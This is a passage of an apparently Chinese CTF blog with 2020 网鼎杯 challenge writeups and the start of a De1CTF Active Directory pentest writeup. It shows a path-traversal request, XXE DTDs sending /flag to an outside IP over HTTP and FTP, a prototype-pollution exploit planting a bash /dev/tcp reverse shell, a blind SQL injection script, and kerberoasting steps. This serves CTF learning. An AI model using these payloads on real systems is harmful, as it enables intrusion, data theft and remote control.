class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>读class文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510214948845.png" alt="image-20200510214948845"></p>
<p>下载下来反编译，</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510215207185.png" alt="image-20200510215207185"></p>
<p>看到poi-ooxml-3.10 has something wrong，之前做swpu的时候就有这个的xxe，可以说是原题，比那个还简单点，新建一个excel文件，然后用压缩包打开，修改里面的[Content_Types].xml,</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510221931914.png" alt="image-20200510221931914"></p>
<p>然后在vps上gx.dtd，上次高校战役Java xxe的文件，，</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999/?%file;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<p>然后监听9999端口，</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222245930.png" alt="image-20200510222245930"></p>
<p>也可以用ftp读</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222359786.png" alt="image-20200510222359786"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://144.34.200.151:2121/%payload;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510222721778.png" alt="image-20200510222721778"></p>
<p>ps:可以看到这里java版本试1.8</p>
<p><img src="https://mount4in.github.io/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311140334086.png" alt="image-20200311140334086"></p>
<p><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=914</a></p>
<h1 id="0x03-notes"><a href="#0x03-notes" class="headerlink" title="0x03 notes"></a>0x03 notes</h1><p>原型链污染，undefsafe包有bug</p>
<p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure>

<p>题目源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>

<p>本地测试下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install undefsafe@2.0.2 -S</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510230414796.png" alt="image-20200510230414796"></p>
<p>然后在题目中试，</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510233825972.png" alt="image-20200510233825972"></p>
<p>然后访问/status</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://503dafc6341d474b969b8cf1f00212de44c78434174f4b4d.cloudgame1.ichunqiu.com:8080/"</span></span><br><span class="line"></span><br><span class="line">re=requests.post(url+<span class="string">'edit_note'</span>,json=&#123;<span class="string">"id"</span>:<span class="string">"__proto__"</span>,<span class="string">"author"</span>:<span class="string">"bash -c \"bash -i &gt;&amp; /dev/tcp/144.34.200.151/6666 0&gt;&amp;1\""</span>,<span class="string">"raw"</span>:<span class="string">"xxx"</span>&#125;)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br><span class="line">re=requests.get(url+<span class="string">'status'</span>,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510233703708.png" alt="image-20200510233703708"></p>
<h1 id="0x04-trace"><a href="#0x04-trace" class="headerlink" title="0x04 trace"></a>0x04 trace</h1><p>限制只能注册20个账号，可以通过时间盲注，但是过滤了information.schema，用无列名注入，猜的表名是flag,利用exp()整数溢出报错，达到一种既不会注册账号（向数据库插入数据），又可以通过时间注入得到flag。</p>
<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510234346894.png" alt="image-20200510234346894"></p>
<p>同理pow也可以。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into flag value(4,pow(if(1,sleep(3),0)+900,900));</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://0c80b72e772d418eaeb6ee0198373cbb589d6f02f80d4359.changame.ichunqiu.com/register_do.php"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">44</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload=<span class="string">r"11',exp(if(ascii(mid((select a.2 from (select 1,2 union select * from flag)a limit 1,1),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),1)+1000));-- -"</span></span><br><span class="line">		data=&#123;<span class="string">"username"</span>:payload.format(i,mid),<span class="string">"password"</span>:<span class="string">"ddd"</span>&#125;</span><br><span class="line">		print(payload.format(i,mid))</span><br><span class="line">		s_time=time.time()</span><br><span class="line">		r=requests.post(url,data=data)<span class="comment">#,proxies=proxies)</span></span><br><span class="line">		print(r.content)</span><br><span class="line">		e_time=time.time()</span><br><span class="line">		<span class="keyword">if</span> e_time-s_time&gt;<span class="number">3</span>:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/image-20200510195425221.png" alt="image-20200510195425221"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>De1ctf Hard_Pentest_2</title>
    <url>/2020/05/09/De1ctf-pentest2/</url>
    <content><![CDATA[<p>DE1CTF题目的环境持续开了一周的时间，然后用了六天的时间才复现完一道题，是一道涉及域渗透的题目，和出</p>
<p>题人咨询，好像题目环境也有点问题，按他的writeup不能成功，然后自己查资料后，最后成功提权，但是最后一</p>
<p>步拿到域控试了半天还是没有成功。由于之前也是没有学过域渗透这方面，借着他的环境边学习边实践，学到了很</p>
<p>多知识点和一些工具的使用，对域渗透也是有了一点了解，题目巧妙地结合了域渗透的一系列知识点。</p>
<a id="more"></a>

<ul>
<li>GPP漏洞：组策略选项（GPP）给域成员添加的账户信息会保存在SYSVOL文件夹中，使用微软公开的密钥可以直接解密出密码。</li>
<li>kerberoasting：如果当前拥有一个普通的域用户权限且对一个用户有写入spn(ServicePrincipalNames)的权限,就可以进行kerberoasting攻击，可以通过爆破得到对应用户的密码。</li>
<li>基于资源的约束委派攻击：个人理解，传统的约束委派是通过msDS-AllowedToDelegateTo 设置了当前可以委派的对象，即我可以委派谁；不同于传统的约束委派，基于资源的约束委派是通过msDS-AllowedToActOnBehalfOfOtherIdentity来设置谁可以委派我。个人认为原理就是伪造TGS。</li>
<li>DCshadow:利用域控之间的数据同步推送，向活动目录数据库中注入恶意数据对象，原理还不是很懂,当有特殊的一些扩展权限就可以利用DCshadow，修改primaryGroupID属性，变成域控。</li>
</ul>
<h1 id="Hard-Pentest-2"><a href="#Hard-Pentest-2" class="headerlink" title="Hard_Pentest_2"></a>Hard_Pentest_2</h1><p><img src="/2020/05/09/De1ctf-pentest2/image-20200504160434565.png" alt="image-20200504160434565"></p>
<p>提示了de1ta的权限，然后利用AdFind.exe查一下，执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\web -recmute</span><br><span class="line">AdFind.exe -s subtree -b &quot;cn&#x3D;de1ta,cn&#x3D;users,dc&#x3D;DE1CTF2020,dc&#x3D;lab&quot; -sc getacl -sddl++ -recmute</span><br></pre></td></tr></table></figure>

<p>可得</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506082021322.png" alt="image-20200506082021322"></p>
<p>web用户具有对De1ta用户有写入SPN权限。具体可以参考下面：</p>
<blockquote>
<h3 id="2-servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1"><a href="#2-servicePrincipalName-28630EBB-41D5-11D1-A9C1-0000F80367C1" class="headerlink" title="(2)  servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)"></a><strong>(2)  servicePrincipalName(28630EBB-41D5-11D1-A9C1-0000F80367C1)</strong></h3><p>如果对一个对象有写入spn的权限，那么就可以对这个对象进行kerberosting了，如果密码强度不强的话，有机会获取到密码。</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t013148e2dda10cec6e.png" alt="img"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/t0159a1c8ffeda51224.png" alt="img"></p>
<p><img src="/2020/05/09/De1ctf-pentest2/t011e4510fd1f6596c9.png" alt="img"></p>
<p>有权限，可以设置spn</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t01a3ac6723857c3446.png" alt="img"></p>
<p>查看spn</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t01710d8bd30669d01d.png" alt="img"></p>
<p>kerberoasting</p>
<p><img src="/2020/05/09/De1ctf-pentest2/t014fc208e692a0e20e.png" alt="img"></p>
<p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/12" target="_blank" rel="noopener">参考</a></p>
</blockquote>
<p>然后去设置spn，spn是win自带的工具，不用上传，</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506084714658.png" alt="image-20200506084714658"></p>
<p>利用spn进行kerberoasting的原理可以参考<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">下面</a>3gstudent师傅文章。</p>
<blockquote>
<h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>官方文档：</p>
<p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p>
<p>全称<code>Service Principal Names</code></p>
<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>
<p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p>
<p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p>
<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
<h3 id="SPN的格式"><a href="#SPN的格式" class="headerlink" title="SPN的格式"></a>SPN的格式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serviceclass&#x2F;host:port&#x2F;servicename</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li>
<li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li>
<li>如果服务运行在默认端口上，则端口号(port)可以省略</li>
</ul>
<h3 id="查询SPN"><a href="#查询SPN" class="headerlink" title="查询SPN"></a>查询SPN</h3><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p>
<h4 id="1-使用SetSPN"><a href="#1-使用SetSPN" class="headerlink" title="(1) 使用SetSPN"></a>(1) 使用SetSPN</h4><p>Win7和Windows Server2008自带的工具</p>
<p>查看当前域内的所有SPN：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -q *&#x2F;*</span><br></pre></td></tr></table></figure>

<p>查看test域内的所有SPN：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn.exe -T test -q *&#x2F;*</span><br></pre></td></tr></table></figure>

<p>输出结果实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CN&#x3D;DC1,OU&#x3D;Domain Controllers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        exchangeRFR&#x2F;DC1</span><br><span class="line">        exchangeRFR&#x2F;DC1.test.com</span><br><span class="line">        exchangeMDB&#x2F;DC1.test.com</span><br><span class="line">        exchangeMDB&#x2F;DC1</span><br><span class="line">        exchangeAB&#x2F;DC1</span><br><span class="line">        exchangeAB&#x2F;DC1.test.com</span><br><span class="line">        SMTP&#x2F;DC1</span><br><span class="line">        SMTP&#x2F;DC1.test.com</span><br><span class="line">        SmtpSvc&#x2F;DC1</span><br><span class="line">        SmtpSvc&#x2F;DC1.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;ForestDnsZones.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;DomainDnsZones.test.com</span><br><span class="line">        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04&#x2F;DC1.test.com</span><br><span class="line">        DNS&#x2F;DC1.test.com</span><br><span class="line">        GC&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">        RestrictedKrbHost&#x2F;DC1.test.com</span><br><span class="line">        RestrictedKrbHost&#x2F;DC1</span><br><span class="line">        HOST&#x2F;DC1&#x2F;TEST</span><br><span class="line">        HOST&#x2F;DC1.test.com&#x2F;TEST</span><br><span class="line">        HOST&#x2F;DC1</span><br><span class="line">        HOST&#x2F;DC1.test.com</span><br><span class="line">        HOST&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">        E3514235-4B06-11D1-AB04-00C04FC2DCD2&#x2F;0f33253b-2314-40f0-b665-f4317b13e6b9&#x2F;test.com</span><br><span class="line">        ldap&#x2F;DC1&#x2F;TEST</span><br><span class="line">        ldap&#x2F;0f33253b-2314-40f0-b665-f4317b13e6b9._msdcs.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;TEST</span><br><span class="line">        ldap&#x2F;DC1</span><br><span class="line">        ldap&#x2F;DC1.test.com</span><br><span class="line">        ldap&#x2F;DC1.test.com&#x2F;test.com</span><br><span class="line">CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        kadmin&#x2F;changepw</span><br><span class="line">CN&#x3D;COMPUTER01,CN&#x3D;Computers,DC&#x3D;test,DC&#x3D;com</span><br><span class="line">        RestrictedKrbHost&#x2F;COMPUTER01</span><br><span class="line">        HOST&#x2F;COMPUTER01</span><br><span class="line">        